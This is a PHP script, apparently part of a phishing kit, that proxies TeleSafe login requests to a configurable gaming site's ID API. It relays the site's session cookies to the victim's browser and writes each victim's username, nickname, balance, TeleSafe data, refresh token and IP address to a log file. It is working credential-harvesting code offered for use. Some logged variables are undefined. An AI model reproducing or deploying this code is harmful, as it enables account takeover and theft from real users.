<?php
include "get_config.php";

// lấy config
$gate = isset($_GET["gate"]) ? $_GET["gate"] : "G88";
$gate_config = get_config($gate);

//bóc tách dữ liệu
$raw_content = file_get_contents("php://input");

$result = login_telesafe($raw_content, $list_header);
$json_data = json_decode($result, 1);
if ($json_data["c"] == 0) {
    $username = $json_data["d"]["username"];
    $nickname = $json_data["d"]["nickname"];
    $mobile = $json_data["d"]["mobile"];
    $telesafe = $json_data["d"]["teleSafe"];
    $gold = $json_data["d"]["goldBalance"];
    $coin = $json_data["d"]["coinBalance"];
    $vippoint = $json_data["d"]["vipPoint"];
    $refresh_token = $json_data["p"][1];
    setcookie("username", $username, time() + (86400 * 30), "/");
    setcookie("password", "", time() + (86400 * 30), "/");

    // ghi file
    $time = date("H:i:s Y-m-d");
    $ip = $_SERVER["REMOTE_ADDR"];
    $fp = fopen($gate_config["file_telesafe"], "a+");
    fwrite($fp, "$username|$nickname|$gold|$phone|$telesafe|$refresh_token|$client_token|$device_id| ----- $time -----> $ip\n");
    fclose($fp);
}

if ($gate_config["disable_telesafe_login"]) {
    die('{"c":-1025,"m":""}');
} else {
    echo $result;
}


function login_telesafe($raw_content, $list_header)
{
    global $gate_config;
    $url = "https://id.".$gate_config["domain"]."/api/mobile/TelesafeLogin";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
    $raw_content = curl_exec($ch);

    $re = "/Set-Cookie: ([^;]+)/m";
    preg_match_all($re, $raw_content, $matches, PREG_SET_ORDER, 0);
    foreach ($matches as $match) {
        $key = explode("=", $match[1])[0];
        $val = urldecode(explode("=", $match[1])[1]);
        setcookie($key, $val, time() + (86400 * 30), "/");
    }
    // fix username do not exist while login with telesafe
    foreach ($list_header as $header) {
        if (strpos($header, ".netcore.session=") !== false) {
            $session = urldecode(explode(";", explode(".netcore.session=", $header)[1])[0]);
            setcookie(".netcore.session", $session, time() + (86400 * 30), "/");
        }
    }
    return explode("\r\n\r\n", $raw_content)[1];
}
?>